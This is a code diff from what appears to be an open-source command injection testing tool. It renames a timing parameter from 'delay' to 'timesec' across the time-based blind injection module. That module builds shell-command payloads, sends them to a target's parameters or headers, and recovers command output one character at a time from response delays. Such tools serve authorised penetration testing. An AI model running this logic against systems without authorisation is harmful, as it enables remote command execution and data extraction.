@@ -43,7 +43,7 @@ from src.core.injections.blind.techniques.time_based import tb_payloads
 """
 Examine the GET/POST requests
 """
-def examine_requests(payload, vuln_parameter, http_request_method, url, delay, url_time_response):
+def examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response):
 
   start = 0
   end = 0
@@ -165,7 +165,7 @@ def custom_header_injection_test(url, vuln_parameter, payload):
 """
 The main command injection exploitation.
 """
-def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
+def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
   
   if settings.TARGET_OS == "win":
     previous_cmd = cmd
@@ -186,10 +186,10 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, ht
   for output_length in range(int(minlen), int(maxlen)):
     if alter_shell:
       # Execute shell commands on vulnerable host.
-      payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request_method)
+      payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
     else:
       # Execute shell commands on vulnerable host.
-      payload = tb_payloads.cmd_execution(separator, cmd, output_length, delay, http_request_method) 
+      payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method) 
     # Fix prefixes / suffixes
     payload = parameters.prefixes(payload, prefix)
     payload = parameters.suffixes(payload, suffix)
@@ -228,11 +228,11 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, ht
       how_long = custom_header_injection_test(url, vuln_parameter, payload)
 
     else:  
-      how_long = examine_requests(payload, vuln_parameter, http_request_method, url, delay, url_time_response)
+      how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
     
     # Examine time-responses
     injection_check = False
-    if (how_long >= settings.FOUND_HOW_LONG and how_long - delay >= settings.FOUND_DIFF):
+    if (how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF):
       injection_check = True
 
     if injection_check == True:        
@@ -272,10 +272,10 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, ht
       for ascii_char in char_pool:
         if alter_shell:
           # Get the execution output, of shell execution.
-          payload = tb_payloads.get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_request_method)
+          payload = tb_payloads.get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
         else:
           # Get the execution output, of shell execution.
-          payload = tb_payloads.get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_method)
+          payload = tb_payloads.get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
         # Fix prefixes / suffixes
         payload = parameters.prefixes(payload, prefix)
         payload = parameters.suffixes(payload, suffix)
@@ -314,11 +314,11 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, ht
           how_long = custom_header_injection_test(url, vuln_parameter, payload)
           
         else:    
-          how_long = examine_requests(payload, vuln_parameter, http_request_method, url, delay, url_time_response)
+          how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
         
         # Examine time-responses
         injection_check = False
-        if (how_long >= settings.FOUND_HOW_LONG and how_long - delay >= settings.FOUND_DIFF):
+        if (how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF):
           injection_check = True
           
         if injection_check == True:
@@ -357,7 +357,7 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, ht
 """
 False Positive check and evaluation.
 """
-def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response):
+def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response):
 
   found_chars = False
   info_msg = "Testing the reliability of used payload... "
@@ -372,9 +372,9 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, delay,
     
     # Execute shell commands on vulnerable host.
     if alter_shell:
-      payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request_method)
+      payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
     else:
-      payload = tb_payloads.cmd_execution(separator, cmd, output_length, delay, http_request_method)
+      payload = tb_payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
     
     # Fix prefixes / suffixes
     payload = parameters.prefixes(payload, prefix)
@@ -414,9 +414,9 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, delay,
       how_long = custom_header_injection_test(url, vuln_parameter, payload)
 
     else:  
-      how_long = examine_requests(payload, vuln_parameter, http_request_method, url, delay, url_time_response)
+      how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
 
-    if (how_long >= settings.FOUND_HOW_LONG) and (how_long - delay >= settings.FOUND_DIFF):
+    if (how_long >= settings.FOUND_HOW_LONG) and (how_long - timesec >= settings.FOUND_DIFF):
       found_chars = True
       break
 
@@ -435,10 +435,10 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, delay,
 
         if alter_shell:
           # Get the execution output, of shell execution.
-          payload = tb_payloads.fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_request_method)
+          payload = tb_payloads.fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
         else:
           # Get the execution output, of shell execution.
-          payload = tb_payloads.fp_result(separator, cmd, num_of_chars, ascii_char, delay, http_request_method)
+          payload = tb_payloads.fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
           
         # Fix prefixes / suffixes
         payload = parameters.prefixes(payload, prefix)
@@ -478,9 +478,9 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, delay,
           how_long = custom_header_injection_test(url, vuln_parameter, payload)
 
         else:    
-          how_long = examine_requests(payload, vuln_parameter, http_request_method, url, delay, url_time_response)
+          how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
 
-        if (how_long >= settings.FOUND_HOW_LONG) and (how_long - delay >= settings.FOUND_DIFF):
+        if (how_long >= settings.FOUND_HOW_LONG) and (how_long - timesec >= settings.FOUND_DIFF):
           output.append(ascii_char)
           break
       
